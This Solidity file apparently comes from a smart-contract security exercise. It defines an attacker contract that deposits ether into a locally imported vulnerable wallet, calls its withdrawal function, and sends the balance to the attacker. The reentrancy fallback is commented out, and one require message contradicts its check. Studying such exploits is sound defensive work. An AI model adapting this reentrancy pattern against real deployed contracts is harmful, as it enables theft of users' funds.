// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Interface for the vulnerable wallet
// interface WalletI {
//     function deposit() external payable;
//     function sendTo(address payable dest) external;
// }
import "./VulnerableWallet.sol";
import "./Wallet2.sol";

contract WalletAttack {
    address payable public attacker; // The address of the attacker (caller)
    uint public numCalls; // Count of reentrancy calls

    constructor() {
        // Save the deployer address as the attacker
        attacker = payable(msg.sender);
    }

    // Function to exploit the vulnerable wallet
    function exploit(Wallet2 _target) public payable {
        require(msg.value == 1 ether, "Deposit must not exceed 1 ether");

        // Deposit the attacker's ether into the target wallet
        _target.deposit{value: msg.value}();

        // Start the reentrancy attack
        // _target.sendTo(payable(address(this)));
        _target.sendTo(payable(address(this)),1);

        // Transfer stolen funds back to the attacker
        attacker.transfer(address(this).balance);
    }

    // // Fallback function to enable reentrancy
    // fallback() external payable {
    //     // Stop the attack after 3 reentrancy calls
    //     if (numCalls < 3) {
    //         numCalls++;
    //         // Wallet(msg.sender).sendTo(payable(address(this)));
    //         Wallet2(msg.sender).sendTo(payable(address(this)),1);
    //     }
    // }
    receive() external payable {
    }
}